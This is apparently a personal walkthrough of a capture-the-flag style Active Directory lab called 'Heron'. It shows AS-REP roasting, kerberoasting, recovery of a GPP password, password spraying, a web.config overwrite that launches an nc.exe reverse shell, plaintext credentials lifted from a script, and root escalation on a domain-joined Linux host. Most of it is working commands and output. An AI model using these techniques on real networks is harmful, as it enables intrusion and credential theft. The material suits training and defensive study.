

Setting up  pivot point


```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.191.53/32 dev ligolo
```





```
pentest@frajmp:~$ realm list
heron.vl
  type: kerberos
  realm-name: HERON.VL
  domain-name: heron.vl
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@heron.vl
  login-policy: allow-realm-logins
```



```
pentest@frajmp:~$ ./fscan -h 10.10.216.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.216.97    is alive
(icmp) Target 10.10.216.101   is alive
(icmp) Target 10.10.216.102   is alive
[*] Icmp alive hosts len is: 3
10.10.216.101:445 open
10.10.216.101:139 open
10.10.216.101:80 open
10.10.216.101:135 open
10.10.216.101:88 open
10.10.216.102:22 open
[*] alive ports len is: 6
start vulscan
[*] NetInfo 
[*]10.10.216.101
   [->]mucdc
   [->]10.10.216.101
[*] OsInfo 10.10.216.101        (Windows Server 2022 Standard 20348)
[*] NetBios 10.10.216.101   [+] DC:mucdc.heron.vl                Windows Server 2022 Standard 20348
```





![[Heron-20251121190628589.webp]]


```
kali@kali 2025-11-21 16:20:42 ~> nxc smb 10.10.216.101 -u users.txt -p users.txt -k
SMB         10.10.216.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\wayne.wood:wayne.wood KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\julian.pratt:wayne.wood KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\samuel.davies account vulnerable to asreproast attack
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\wayne.wood:julian.pratt KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\julian.pratt:julian.pratt KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\samuel.davies account vulnerable to asreproast attack
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\wayne.wood:samuel.davies KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\julian.pratt:samuel.davies KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\samuel.davies account vulnerable to asreproast attack
```



```
kali@kali 2025-11-21 16:21:18 ~> GetNPUsers.py heron.vl/ -usersfile users.txt -format hashcat -outputfile hash.txt     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                                                      
[-] User wayne.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User julian.pratt doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$samuel.davies@HERON.VL:1ac2b6dc8130ffe3c484d787a3e7e169$df1198509299139ffde8fee3cd0cf5de25d948db537073c3d9d5a2e75a42cad9185e8ef35a80cf6d3412165e2ab30e61fb9babdfabf57cd92b46d1a714eca75fb29dc12a0ea50b28d33559dd729c96b809be786
6208e45a34b3f67d783e5623c24d16232482b31c9f27795ace06f3eb8e746ab066ef7e087cb36eb07143e06237f119c40f23cf0d30c2d9bad97dd3bf15f06e4d6c15e49cd5bc04f1c3e1cf3716fc69e6770121d484bc32841b7aa1a819562f5631cde2cfa64a5643be1964257bad874a8dc36fd9059a2
4930f8b7fb06ab177f9d6fbcddfc38adda0511bc85cdedf2441c
```


```
Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$samuel.davies@HERON.VL:1ac2b6dc8130ffe3c484d787a3e7e169$df1198509299139ffde8fee3cd0cf5de25d948db537073c3d9d5a2e75a42cad9185e8ef35a80cf6d3412165e2ab30e61fb9babdfabf57cd92b46d1a714eca75fb29dc12a0ea50b28d33559dd729c96b809be7866208e45a34b3f67d783e5623c24d16232482b31c9f27795ace06f3eb8e746ab066ef7e087cb36eb07143e06237f119c40f23cf0d30c2d9bad97dd3bf15f06e4d6c15e49cd5bc04f1c3e1cf3716fc69e6770121d484bc32841b7aa1a819562f5631cde2cfa64a5643be1964257bad874a8dc36fd9059a24930f8b7fb06ab177f9d6fbcddfc38adda0511bc85cdedf2441c:l6fkiy9oN
```



```
kali@kali 2025-11-21 16:22:22 ~> nxc ldap 10.10.216.101 -u samuel.davies -p l6fkiy9oN --kerberoast kerb.txt 
LDAP        10.10.216.101   389    MUCDC            [*] Windows Server 2022 Build 20348 (name:MUCDC) (domain:heron.vl) (signing:None) (channel binding:Never) 
LDAP        10.10.216.101   389    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN 
LDAP        10.10.216.101   389    MUCDC            [*] Skipping disabled account: krbtgt
LDAP        10.10.216.101   389    MUCDC            [*] Total of records returned 1
LDAP        10.10.216.101   389    MUCDC            [*] sAMAccountName: svc-web-accounting, memberOf: ['CN=audit,CN=Users,DC=heron,DC=vl', 'CN=SSH,CN=Users,DC=heron,DC=vl'], pwdLastSet: 2024-06-01 15:07:44.428061, lastLogon: 2024-06-07 10:34:23.314374
LDAP        10.10.216.101   389    MUCDC            $krb5tgs$23$*svc-web-accounting$HERON.VL$heron.vl\svc-web-accounting*$09c3b697b9ef7810a7d92b72fbcf4dae$ceb3023f0ec963776c1fb925ed8147be0f73d6a6ea1976ab28aecf476dadf79d5f40b416796bf71123c211c91fa8fa8cf2d8ae0f578fde11a7f3f23d97f07a16acd70679ab63a92ed8b1532f46c039a75aa84048f022db9034fc0923718450d9ab6a230a55220f55a7b963a357d6da8f6968a4a723f171ad4ddf709e1498fe07d1b3957400074cd422338ef3542e5b74296275dce402ba2844bc536b6e90da276e438e64fcf0c00ca508afe0b322633f3c4cc2304fc5c79e32dccad1c823229da4d62d1a9bf7b54c83a8bef33fd76edbc4e1ae8461a9ab8023978c69abde3433def304665f1e4698e71986edbd1ee90d6c40447dc5bc973bf24439b43077577b2d0fcef9efdac30e8476df0ce427f2894f3201d2dc17f9b95ffa36a3ea9e3e5fd586c1b03ec3a12d6a309cbabf1d71d1d2b45fa43f4bfb9b8a02f4a31e2d070b0fcf05536d2123a5ccdb5ae574bcd1bb43c772863af03dadd82a1f969450a9db5fde20cac0109be787a21424809959613bf250f271ae5da9f862fb22fbb48b36bee24272ca0d11d6471dcce2eb230e29c2171b1be7864da308cb422238610c065e821022f001a7ed2b9e0cddfac9f12e8a7e17903034b485bf265ac52fb660bae06bf695604aa4a8aa93ec1f3aeec24b9697355de5f74f26755d3e3ce6467a4987f91d7e71dba01eccfa4b48602d53cd0cc7fc5e99874dd3ecdb10a92cdf1303c26be43a4823afd587d348e2248b588b979bc93431e3a288919049172cd24e7fa10502afd2420a0b417bfebd107b0a2d34481179309b392a9d3f50847984b6d50f2ce431e8caf0b2a6a5894311335eb3a806fc7d297a8478d595c25c1ba89602c512e21e52baf668f23a443a0d78ff4760ea06f97addf5c58eabd68cf37b5da878d04ac3a6d3607224498d8fe82c2886d977cbf7cf91add0d4b159b006ecb7e6d01ca8500f00711f699a3ec34a8b00f967b674968f43e8354aefec70d7766eb6bc33ff056004892fd8f588ea244d5add63e1cf6bee44512ca2a6e4f97756a6593084af89c6350b3ee69447aef8b1aa017c74e15ef08f08829034949a4e5c3a735a5e27bc3590e9907f3b0cca46d36df43e59d0962e93bf4d327da88bfdd05407ccdcdd53ec949662df99d2346fc7f0f8c28b4a77a7e32bc2e52a6df33904d24fbf30eee5934e5f4c4b8e7a669a429ad2e49744ab17393a3eb74cd8aa201b4008c7052c8ffb7eb8d02eec3ace44df88334a643a105b4c6ddc5a7bd0aa822c0402ccc9cf6937e92904c4a4a267f0199cb1f759fe5d55d3a9fd135d8c506bea6d2551f17451f7785b95306ad37e6542923197484049ed23ee58a8ca2fe76a5aefc01b07301198cd34a019c0779408e66a9cc945454f798afc7e97939ed38fd000d24c0f0a1e2f77cc8e01ede688055f259b1bb108d7c44ae6584b24d89adce8bfe86706d35f130599820e59e0bac6d608b1d7c3244e55e009af4547e1a6639dd9d1fc24bdcbf9243295b61ad9e6bf2deb47bf8732f752294ed817c7b273a28729d8e52d0d9c4b469307e40303a89cac663238ebe2a50e38d756a1ccd8b1b255c5de734410888f75a29fb695c5cd54fb5b031eca8dad0521ecf7fd264b6ea50b2e9a2c62fb82004255da6c47cc771e57e014f260163cf05ac3ed398b776908dab68c88b591ff9707567762ae2d59adef9a593b75457345e31e4c8c7eb537e6defb1601630dc478c1ced6b0f7991fca7f31e6715382796b8c9a0bb158099f03a5abdbccd192d97fcdfb714a11c4e2b9155f080b6a8c64e7375bb8edcf64df3ae8
```


Cant crack this kerberos, so now we move on


```
kali@kali 2025-11-21 16:28:03 ~> nxc smb 10.10.216.101 -u samuel.davies -p 'l6fkiy9oN' --shares
SMB         10.10.216.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN 
SMB         10.10.216.101   445    MUCDC            [*] Enumerated shares
SMB         10.10.216.101   445    MUCDC            Share           Permissions     Remark
SMB         10.10.216.101   445    MUCDC            -----           -----------     ------
SMB         10.10.216.101   445    MUCDC            accounting$                     
SMB         10.10.216.101   445    MUCDC            ADMIN$                          Remote Admin
SMB         10.10.216.101   445    MUCDC            C$                              Default share
SMB         10.10.216.101   445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.216.101   445    MUCDC            home$           READ            
SMB         10.10.216.101   445    MUCDC            IPC$            READ            Remote IPC
SMB         10.10.216.101   445    MUCDC            it$                             
SMB         10.10.216.101   445    MUCDC            NETLOGON        READ            Logon server share 
SMB         10.10.216.101   445    MUCDC            SYSVOL          READ            Logon server share 
SMB         10.10.216.101   445    MUCDC            transfer$       READ,WRITE      

```


Okay time to enumerate these!

```
kali@kali 2025-11-21 16:45:05 ~> cat /home/kali/.nxc/modules/nxc_spider_plus/10.10.216.101.json                                                                                                                              16:45:06 [79/79]
{                                                
    "CertEnroll": {                              
        "heron-CA+.crl": {                       
            "atime_epoch": "2025-11-21 14:24:42",
            "ctime_epoch": "2024-06-01 15:38:41",
            "mtime_epoch": "2025-11-21 14:24:42",                                                                     
            "size": "964 B"                      
        },                                       
        "heron-CA.crl": {                        
            "atime_epoch": "2025-11-21 14:24:42",
            "ctime_epoch": "2024-06-01 15:38:41",
            "mtime_epoch": "2025-11-21 14:24:42",                                                                     
            "size": "1.12 KB"                    
        },                                       
        "mucdc.heron.vl_heron-CA.crt": {         
            "atime_epoch": "2024-06-01 15:38:40",
            "ctime_epoch": "2024-06-01 15:38:40",
            "mtime_epoch": "2024-06-01 15:38:40",                                                                     
            "size": "1.34 KB"                    
        },                                       
        "nsrev_heron-CA.asp": {                                                                                       
            "atime_epoch": "2024-06-02 10:58:52",
            "ctime_epoch": "2024-06-02 10:58:52",
            "mtime_epoch": "2024-06-02 10:58:52",                                                                                                                                                                                            
            "size": "315 B"                      
        }                                        
    },                                                                                                                                                                                                                                       
    "NETLOGON": {                                
        "Bginfo64.exe": {                        
            "atime_epoch": "2024-06-02 10:41:33",
            "ctime_epoch": "2024-06-02 10:41:15",
            "mtime_epoch": "2024-06-02 10:41:18",
            "size": "2.65 MB"                                                                                         
        },                                       
        "bginfo.bgi": {                          
            "atime_epoch": "2024-06-02 10:42:48",
            "ctime_epoch": "2024-06-02 10:42:45",
            "mtime_epoch": "2024-06-02 10:42:56",
            "size": "1.96 KB"                                                                                         
        },                                       
        "logon.vbs": {                           
            "atime_epoch": "2024-06-02 10:43:52",
            "ctime_epoch": "2024-06-02 10:41:42",
            "mtime_epoch": "2024-06-02 10:43:52",
            "size": "351 B"                                                                                           
        }                                        
    },                                           
    "SYSVOL": {                                  
        "heron.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2024-05-26 09:48:22",
            "ctime_epoch": "2024-05-26 09:37:44",                                                                                                                                                                                            
            "mtime_epoch": "2024-05-26 09:48:22",
            "mtime_epoch": "2024-05-26 09:48:22",                                                                                                                                                                                            
            "size": "22 B"                       
        },                                       
        "heron.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": { 
            "atime_epoch": "2024-05-26 09:37:44",
            "ctime_epoch": "2024-05-26 09:37:44",                                                                     
            "mtime_epoch": "2024-05-26 09:37:48",
            "size": "1.07 KB"                    
        },                                       
        "heron.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2024-05-26 09:48:22",
            "ctime_epoch": "2024-05-26 09:48:22",                                                                     
            "mtime_epoch": "2024-05-26 09:48:22",
            "size": "2.72 KB"                    
        },                                       
        "heron.vl/Policies/{3FFDA928-A6D1-4860-936F-25D9D2D7EAEF}/GPT.INI": {
            "atime_epoch": "2024-05-26 10:21:54",
            "ctime_epoch": "2024-05-26 10:21:54",                                                                     
            "mtime_epoch": "2024-05-26 10:21:54",
            "size": "59 B"                       
        },                                                                                                            
        "heron.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2024-06-02 11:07:32",
            "ctime_epoch": "2024-05-26 09:37:44",                                                                                                                                                                                            
            "mtime_epoch": "2024-06-02 11:07:32",
            "size": "22 B"                       
        },                                                                                                                                                                                                                                   
        "heron.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": { 
            "atime_epoch": "2024-06-02 11:07:32",
            "ctime_epoch": "2024-05-26 09:37:44",
            "mtime_epoch": "2024-06-02 11:07:32",
            "size": "6.38 KB"                    
        },                                                                                                            
        "heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/GPT.INI": {
            "atime_epoch": "2024-06-04 16:00:13",
            "ctime_epoch": "2024-06-04 15:57:41",
            "mtime_epoch": "2024-06-04 16:00:13",
            "size": "59 B"                       
        },                                                                                                            
        "heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2024-06-04 16:01:07",
            "ctime_epoch": "2024-06-04 15:59:44",
            "mtime_epoch": "2024-06-04 16:01:07",
            "size": "1.11 KB"                    
        },                                                                                                            
        "heron.vl/Policies/{866ECED1-24B0-46EF-92F5-652345A1820C}/GPT.INI": {
            "atime_epoch": "2024-06-04 15:57:26",
            "ctime_epoch": "2024-05-26 10:23:29",
            "mtime_epoch": "2024-06-04 15:57:26",
            "size": "59 B"
        },
        "heron.vl/Policies/{866ECED1-24B0-46EF-92F5-652345A1820C}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf": { 
            "atime_epoch": "2024-06-04 15:56:53",
            "ctime_epoch": "2024-06-04 15:56:53",
            "mtime_epoch": "2024-06-04 15:56:53",
            "size": "142 B"
        },
        "heron.vl/scripts/Bginfo64.exe": {
            "atime_epoch": "2024-06-02 10:41:33",
            "ctime_epoch": "2024-06-02 10:41:15",
            "mtime_epoch": "2024-06-02 10:41:18",
            "size": "2.65 MB"
        },
        "heron.vl/scripts/bginfo.bgi": {
            "atime_epoch": "2024-06-02 10:42:48",
            "ctime_epoch": "2024-06-02 10:42:45",
            "mtime_epoch": "2024-06-02 10:42:56",
            "size": "1.96 KB"
        },
        "heron.vl/scripts/logon.vbs": {
            "atime_epoch": "2024-06-02 10:43:52",
            "ctime_epoch": "2024-06-02 10:41:42",
            "mtime_epoch": "2024-06-02 10:43:52",
            "size": "351 B"
        }
    },
    "home$": {},
    "transfer$": {}
}⏎                                                         

```


Got stuck here and for some reason thought it was gonna be writeable, clearly since its readable then there shoudlve been somethhing of importance here for me to read.

```
kali@kali 2025-11-21 17:04:51 ~/.n/m/n/1/S/h/Policies> cd {6CC75E8D-586E-4B13-BF80-B91BEF1F221C}
kali@kali 2025-11-21 17:05:00 ~/.n/m/n/1/S/h/P/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}> ls
GPT.INI  Machine/
kali@kali 2025-11-21 17:05:00 ~/.n/m/n/1/S/h/P/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}> cat GPT.INI 
[General]
Version=8
displayName=New Group Policy Object
kali@kali 2025-11-21 17:05:04 ~/.n/m/n/1/S/h/P/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}> cd Machine/
kali@kali 2025-11-21 17:05:05 ~/.n/m/n/1/S/h/P/{/Machine> ls
Preferences/
kali@kali 2025-11-21 17:05:05 ~/.n/m/n/1/S/h/P/{/Machine> cd Preferences/Groups/
kali@kali 2025-11-21 17:05:07 ~/.n/m/n/1/S/h/P/{/M/P/Groups> ls
Groups.xml
kali@kali 2025-11-21 17:05:08 ~/.n/m/n/1/S/h/P/{/M/P/Groups> cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2024-06-04 15:59:45" uid="{535B586D-9541-4420-8E32-224F589E4F3A}"><Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)"><Members><Member name="HERON\svc-web-accounting" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-24602"/><Member name="HERON\svc-web-accounting-d" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-26101"/></Members></Properties></Group>
        <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2024-06-04 16:00:13" uid="{F3B0115E-D062-46CC-B10C-C3EB743C824A}"><Properties action="U" newName="_local" fullName="" description="local administrator" cpassword="1G19pP9gbIPUr5xLeKhEUg==" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/></User>
</Groups>

```

Apprently using ChatGPT we figured out that this GPP password is encrypted, decrypting it we find the following

So now we re-enumerate the users just incase to see if theres password re-use

```
kali@kali 2025-11-21 17:27:40 ~> nxc smb 10.10.216.101 -u samuel.davies -p 'l6fkiy9oN' --users-export users.txt
SMB         10.10.216.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN 
SMB         10.10.216.101   445    MUCDC            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.216.101   445    MUCDC            _admin                        2024-06-02 10:55:39 0       Built-in account for administering the computer/domain 
SMB         10.10.216.101   445    MUCDC            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.216.101   445    MUCDC            krbtgt                        2024-05-26 09:38:19 0       Key Distribution Center Service Account 
SMB         10.10.216.101   445    MUCDC            Katherine.Howard              2024-05-26 11:47:11 0       T0 Windows Admin 
SMB         10.10.216.101   445    MUCDC            Rachael.Boyle                 2024-05-26 11:47:11 0        
SMB         10.10.216.101   445    MUCDC            Anthony.Goodwin               2024-05-26 11:47:11 0        
SMB         10.10.216.101   445    MUCDC            Carol.John                    2024-05-26 11:47:11 0                                                                                                                                      
SMB         10.10.216.101   445    MUCDC            Rosie.Evans                   2024-05-26 11:47:11 0        
SMB         10.10.216.101   445    MUCDC            Adam.Harper                   2024-05-26 11:47:11 0        
SMB         10.10.216.101   445    MUCDC            Adam.Matthews                 2024-05-26 11:47:11 0        
SMB         10.10.216.101   445    MUCDC            Steven.Thomas                 2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Amanda.Williams               2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Vanessa.Anderson              2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Jane.Richards                 2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Rhys.George                   2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Mohammed.Parry                2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Julian.Pratt                  2024-06-01 15:25:42 0       T1 Linux Admin 
SMB         10.10.216.101   445    MUCDC            Wayne.Wood                    2024-05-26 11:47:12 5        
SMB         10.10.216.101   445    MUCDC            Danielle.Harrison             2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Samuel.Davies                 2024-06-02 10:39:35 0       Leaves Company 06/24 
SMB         10.10.216.101   445    MUCDC            Alice.Hill                    2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Jayne.Johnson                 2024-05-26 11:47:12 0        
SMB         10.10.216.101   445    MUCDC            Geraldine.Powell              2024-05-26 11:47:12 0                                                                                                                                      
SMB         10.10.216.101   445    MUCDC            adm_hoka                      2024-05-26 11:50:28 0       t0 
SMB         10.10.216.101   445    MUCDC            adm_prju                      2024-06-01 15:19:01 0       t1 
SMB         10.10.216.101   445    MUCDC            svc-web-accounting            2024-06-01 15:07:44 0        
SMB         10.10.216.101   445    MUCDC            svc-web-accounting-d          2024-06-02 20:00:59 0        
SMB         10.10.216.101   445    MUCDC            [*] Enumerated 27 local users: HERON
SMB         10.10.216.101   445    MUCDC            [*] Writing 27 local users to users.txt

```




now we spray once more!

```
kali@kali 2025-11-21 17:46:28 ~> nxc smb 10.10.216.101 -u users.txt -p 'H3r0n2024#!' -k
SMB         10.10.216.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\_admin:H3r0n2024#! KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\Guest:H3r0n2024#! KDC_ERR_CLIENT_REVOKED 
[...]
SMB         10.10.216.101   445    MUCDC            [-] heron.vl\svc-web-accounting:H3r0n2024#! KDC_ERR_PREAUTH_FAILED 
SMB         10.10.216.101   445    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#!

```

now lets see what the shares have

```
kali@kali 2025-11-21 18:11:06 ~/.n/m/n/1/accounting$> ls
AccountingApp.deps.json  AccountingApp.runtimeconfig.json  appsettings.json                                     Microsoft.EntityFrameworkCore.Abstractions.dll  SQLitePCLRaw.batteries_v2.dll  SQLitePCLRaw.provider.e_sqlite3.dll  wwwroot
AccountingApp.pdb        appsettings.Development.json      Microsoft.AspNetCore.Cryptography.KeyDerivation.dll  Microsoft.Extensions.Identity.Stores.dll        SQLitePCLRaw.core.dll          web.config
```

Heres an example!

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
	      <aspNetCore processPath="cmd.exe" arguments="/k test.exe" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="OutOfProcess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->⏎                                                             
```



```
kali@kali 2025-11-22 16:53:42 ~> smbclient.py heron.vl/svc-web-accounting-d:'H3r0n2024#!'@10.10.191.53
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use accounting$
# rm web.config
# put /home/kali/box/vul/heron/web.config
# put /home/kali/box/vul/heron/nc.exe
```


So here is MY idea


```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
	      <aspNetCore processPath="cmd.exe" arguments="/k nc.exe 10.10.8.4.215 4444 -e cmd.exe" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="OutOfProcess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->⏎                                                             
```



Now we setup a listener to pivot through ligolo

```
[Agent : pentest@frajmp.heron.vl] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
INFO[2804] Listener 1 created on remote agent!          
```









```
kali@kali 2025-11-22 16:45:41 ~/b/v/heron> rlwrap -crA nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56522
Microsoft Windows [Version 10.0.20348.2461]
(c) Microsoft Corporation. All rights reserved.

C:\webaccounting>ping accounting-stag.heron.vl
ping accounting-stag.heron.vl
Ping request could not find host accounting-stag.heron.vl. Please check the name and try again.

C:\webaccounting>ping accounting-prep.heron.vl
ping accounting-prep.heron.vl
Ping request could not find host accounting-prep.heron.vl. Please check the name and try again.
```


```
kali@kali 2025-11-22 17:27:49 ~/b/v/heron> rlwrap -crA nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43154
Microsoft Windows [Version 10.0.20348.2461]
(c) Microsoft Corporation. All rights reserved.

C:\webaccounting>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                SID                                            
======================== ===============================================
heron\svc-web-accounting S-1-5-21-1568358163-2901064146-3316491674-24602


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                                          Attributes                                        
=========================================== ================ ============================================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                          Well-known group S-1-5-3                                                      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                               Well-known group S-1-2-1                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                           Alias            S-1-5-32-568                                                 Mandatory group, Enabled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                                      Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\accounting                      Well-known group S-1-5-82-621213981-2788807971-2907995471-119741236-197385786 Mandatory group, Enabled by default, Enabled group
HERON\ssh                                   Group            S-1-5-21-1568358163-2901064146-3316491674-24573              Mandatory group, Enabled by default, Enabled group
HERON\audit                                 Group            S-1-5-21-1568358163-2901064146-3316491674-24603              Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                                  Mandatory group, Enabled by default, Enabled group

```


In the scripts fodler we find this ps1 script

```
C:\Windows>cd scripts
cd scripts

C:\Windows\scripts>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5AA1-68C9

 Directory of C:\Windows\scripts

06/02/2024  02:59 AM    <DIR>          .
06/02/2024  07:26 AM    <DIR>          ..
06/06/2024  06:12 AM             1,416 dns.ps1
06/01/2024  07:26 AM               221 ssh.ps1
               2 File(s)          1,637 bytes
               2 Dir(s)   8,021,147,648 bytes free

C:\Windows\scripts>type ssh.ps1
type ssh.ps1
$plinkPath = "C:\Program Files\PuTTY\plink.exe"
$targetMachine = "frajmp"
$user = "_local"
$password = "Deplete5DenialDealt" <--------------------- password
& "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"
```



```
pentest@frajmp:~$ su _local
Password: 
_local@frajmp:/home/pentest$ 
```


```
_local@frajmp:/var/log$ sudo -l
[sudo] password for _local: 
Matching Defaults entries for _local on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User _local may run the following commands on localhost:
    (ALL : ALL) ALL
root@frajmp:/var/log# 
```

so linux machines tht are domain joined have this keytab file present!

```
root@frajmp:/home/svc-web-accounting@heron.vl# klist -k /etc/krb5.keytab 
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 FRAJMP$@HERON.VL
   2 FRAJMP$@HERON.VL
   2 FRAJMP$@HERON.VL
   2 host/FRAJMP@HERON.VL
   2 host/FRAJMP@HERON.VL
   2 host/FRAJMP@HERON.VL
   2 host/frajmp.heron.vl@HERON.VL
   2 host/frajmp.heron.vl@HERON.VL
   2 host/frajmp.heron.vl@HERON.VL
   2 RestrictedKrbHost/FRAJMP@HERON.VL
